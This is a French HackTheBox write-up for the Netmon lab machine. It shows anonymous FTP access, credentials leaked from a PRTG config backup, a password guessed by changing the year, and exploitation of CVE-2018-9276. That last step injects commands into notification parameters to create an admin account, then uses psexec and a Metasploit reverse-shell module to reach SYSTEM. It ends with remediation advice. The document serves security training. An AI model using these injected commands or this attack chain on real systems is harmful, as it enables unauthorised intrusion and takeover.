# Netmon — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server 2016 Standard |
| **Difficulté** | Easy |
| **Date** | 2026-09-27 |
| **Vecteur** | Fuite de config (FTP) → dérivation de mot de passe → injection de commande PRTG |
| **CVE** | CVE-2018-9276 |

> Remplacer `<IP_CIBLE>` par l'IP de ta session (change à chaque reset de la machine).
> Mon IP VPN (`tun0`) = `10.10.14.x`.

---

## TL;DR

Chaîne complète, sans exploit mémoire ni CVE « clé en main » :

**FTP anonyme → lecture d'une sauvegarde de config PRTG → identifiants périmés → dérivation du mot de passe (année +1) → connexion à PRTG → injection de commande authentifiée (CVE-2018-9276) via la fonction de notification → création d'un compte admin local → psexec → SYSTEM.**

L'intérêt de la machine : aucune étape magique, une logique d'enchaînement de A à Z.

---

## 1. Reconnaissance

```bash
nmap -sC -sV -p- -oA nmap/netmon <IP_CIBLE>
```

Ports notables :

| Port | Service | Intérêt |
| --- | --- | --- |
| 21 | FTP | **login anonyme autorisé** |
| 80 | HTTP | **PRTG Network Monitor** (interface web) |
| 135 / 139 / 445 | SMB | Windows Server 2016 (signing: False) |

> Deux surfaces liées : un FTP en lecture **et** une appli web. La question de méthode :
> *que puis-je lire via le FTP qui servirait sur l'appli web ?*

---

## 2. Flag user (via FTP anonyme)

```bash
ftp <IP_CIBLE>        # login: anonymous / pas de mot de passe
```

Le FTP donne un accès **lecture** au système de fichiers. Le flag user est dans le
répertoire utilisateur (`C:\Users\Public\` sur cette machine).

> Le FTP n'est pas un shell : c'est une **fuite d'information**. On ne peut pas
> exécuter de commande, seulement lire/télécharger.

---

## 3. Fuite des identifiants PRTG

PRTG stocke sa configuration sur le disque, accessible via le FTP dans :

```
C:\ProgramData\Paessler\PRTG Network Monitor\
```

Fichiers clés :
- `PRTG Configuration.dat` (config active)
- `PRTG Configuration.old.bak` (**ancienne sauvegarde** ← la mine d'or)

Dans la sauvegarde, on trouve :

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

> Le fichier `.old.bak` contient un mot de passe **périmé**. Il ne fonctionne pas tel quel.

---

## 4. Dérivation du mot de passe

Le mot de passe `PrTg@dmin2018` est refusé sur l'interface web. La sauvegarde date de 2018 ;
l'admin a dû changer son mot de passe **a minima** depuis. Réflexe **password mangling** :
un mot de passe contenant une **année** s'incrémente.

```
PrTg@dmin2018   →   PrTg@dmin2019   ✅
```

Connexion réussie à l'interface PRTG avec `prtgadmin` / `PrTg@dmin2019`.

> Leçon : ne jamais jeter un mot de passe périmé — le dériver (année +1, casse,
> caractère ajouté). Comportement humain classique face à une expiration forcée.

---

## 5. Exploitation — CVE-2018-9276 (injection de commande authentifiée)

### Mécanisme

PRTG permet de créer des **notifications** qui exécutent un programme lors d'un événement.
Le champ de paramètres de ce script n'est pas assaini : on y injecte une commande
(séparée par `;`), exécutée par le service PRTG qui tourne en **SYSTEM**.

### Version manuelle (sans Metasploit)

L'exploitation se fait **dans l'interface web** :

1. **Setup → Account Settings → Notifications → Add new notification**.
2. Activer **"Execute Program"**.
3. Dans le champ programme, choisir un script `.ps1` existant et injecter la commande
   dans le champ **paramètre**, par exemple :
   ```
   test.txt | net user pentest P3nT3st! /add
   ```
   puis une seconde notification :
   ```
   test.txt | net localgroup administrators pentest /add
   ```
4. Déclencher la notification : bouton **"Test"** (l'icône cloche) sur la notif créée.
5. Laisser passer le cycle PRTG (quelques secondes).

> Le paramètre est interprété par PowerShell côté serveur. Le `|` puis la commande
> `net user` crée le compte ; la 2e notification l'ajoute aux administrateurs.

### Vérifier le compte créé

```bash
netexec smb <IP_CIBLE> -u pentest -p 'P3nT3st!'
# attendu : [+] netmon\pentest:P3nT3st! (Pwn3d!)
```

⚠️ Le mot de passe est **`P3nT3st!`** avec le `!` — quotes simples obligatoires en bash
(le `!` déclenche l'expansion d'historique sinon).

---

## 6. Shell SYSTEM

```bash
impacket-psexec pentest:'P3nT3st!'@<IP_CIBLE>
whoami
# nt authority\system
```

Flag root :

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

> Les flags ne sont pas publiés (règle HTB — pas de spoiler).

---

## Annexe — Voie Metasploit (pour comparaison)

```
use exploit/windows/http/prtg_authenticated_rce
set RHOSTS <IP_CIBLE>
set ADMIN_USERNAME prtgadmin
set ADMIN_PASSWORD PrTg@dmin2019
set LHOST tun0           
run
```

Le module automatise tout (auth + notification + réception du shell) → Meterpreter SYSTEM.

---

## 7. Remédiation

- **Mettre à jour PRTG** (CVE-2018-9276 corrigée après 18.2.39).
- Ne pas exposer les fichiers de config via un **FTP anonyme** (le désactiver).
- **Purger les sauvegardes** contenant des secrets ; ne pas laisser de `.bak` lisibles.
- Politique de mot de passe robuste (interdire la simple incrémentation d'année).
- Faire tourner les services avec le **moindre privilège**, pas en SYSTEM.

---

## 8. Leçons

- Changement de registre vs Lame/Blue/Legacy : **aucun CVE mémoire clé en main**,
  mais une **chaîne logique** (fuite → dérivation → exploit authentifié).
- **Fuite d'info ≠ exploitation** : un accès en lecture (FTP) sert à alimenter l'étape
  suivante, pas à obtenir un shell directement.
- **Password mangling** : un secret périmé reste exploitable après dérivation.
- **Injection de commande** via une fonctionnalité légitime détournée (même famille
  que Lame, contexte applicatif authentifié).
- Pièges d'adressage à retenir : `10.0.2.x` (VM VirtualBox) ≠ `10.10.14.x` (moi/tun0)
  ≠ `10.129.x.x` (cible). Confondre les trois casse tout.

---

## Références

- CVE-2018-9276 — <https://nvd.nist.gov/vuln/detail/CVE-2018-9276>
- Codewatch (recherche d'origine) — <https://www.codewatch.org/blog/?p=453>
- Exploit-DB 46527
- Module Metasploit : `exploit/windows/http/prtg_authenticated_rce`
